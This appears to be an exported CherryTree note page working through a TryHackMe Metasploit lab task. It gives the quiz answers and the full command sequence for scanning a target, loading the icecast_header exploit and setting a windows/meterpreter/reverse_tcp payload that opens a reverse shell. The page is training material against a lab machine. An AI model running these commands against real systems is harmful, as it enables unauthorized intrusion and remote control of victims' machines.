<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Task 5</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Task 5</h1><br/><strong>Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command </strong><strong><code>db_nmap -sV MACHINE_IP </code></strong><br /><img src="images/40-1.png" alt="images/40-1.png" /><br /><br /><strong>What service does nmap identify running on port 135?</strong><br />• msrpc<br /><br /><strong>Let's go ahead and see what information we have collected in the database. Try typing the command </strong><strong><code>hosts</code></strong><strong> into the msfconsole now.</strong><br /><br /><br /><strong>How about something else from the database, try the command </strong><strong><code>services</code></strong><strong> now.</strong><br /><br /><br /><strong>One last thing, try the command </strong><strong><code>vulns</code></strong><strong> now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully. </strong><br /><br /><br /><strong>Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type </strong><strong><code>use</code></strong><strong> followed by a unique string found within only the target exploit. For example, try this out now with the following command </strong><strong><code>use icecast</code></strong><strong>. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start</strong><br />• exploit/windows/http/icecast_header<br /><br /><strong>While that use command with the unique string can be incredibly  useful that's not quite the exploit we want here. Let's now run the  command </strong><strong><code>search multi/handler</code></strong><strong>. <br />Go ahead and run the command </strong><strong><code>use NUMBER_NEXT_TO  exploit/multi/handler</code></strong><strong>  wherein the number will be what appears in that far left column  (typically this will be 4 or 5). In this way, we can use our search  results without typing out the full name/path of the module we want to  use.</strong><br /><br /><br /><br /><strong>What is the name of the column on the far left side of the console that shows up next to 'Name'?</strong><br />• #<br /><br />                                                                                        <br /><strong>Now type the command </strong><strong><code>use NUMBER_FROM_PREVIOUS_QUESTION</code></strong><strong>. This is the short way to use modules returned by search results. </strong><br /><br /><br /><br />                                                                                        <br /><strong>Next, let's set the payload using this command </strong><strong><code>set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><strong>. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command </strong><strong><code>set LHOST YOUR_IP_ON_TRYHACKME</code></strong><strong>. You might have to check your IP using the command </strong><strong><code>ip addr</code></strong><strong>, it will likely be your tun0 interface.</strong><br /><br /><br /><br />                                                                                        <br /><strong>Let's go ahead and return to our previous exploit, run the command </strong><strong><code>use icecast</code></strong><strong> to select it again.</strong><br /><br /><br /><br />                                                                                        <br /><strong>One last step before we can run our exploit. Run the command </strong><strong><code>set RHOSTS MACHINE_IP </code></strong><strong> to tell Metasploit which target to attack.  </strong> <br /><br /><br /><br />                                                            <br /><strong>Once you're set those variables correctly, run the exploit now via either the command </strong><strong><code>exploit</code></strong><strong> or the command </strong><strong><code>run -j</code></strong><strong> to run this as a job.</strong><br />• after running the exploit the prompt changes from msf6 to meterpreter, indicating that a session has been started<br /><br /><br />                                                            <br /><strong>Once we've started this, we can check all of the jobs running on the system by running the command </strong><strong><code>jobs</code></strong><br /><br /><br /><br />                                                            <br /><strong>After we've established our connection in the next task, we can list all of our sessions using the command </strong><strong><code>sessions</code></strong><strong>. Similarly, we can interact with a target session using the command </strong><strong><code>sessions -i SESSION_NUMBER</code></strong><br /><br /><br />                         <br />                        <br /><br />                            <br />                        <br /><br />                            <br />                        <br /><br />                            <br />                        <br /><br /></div></body></html>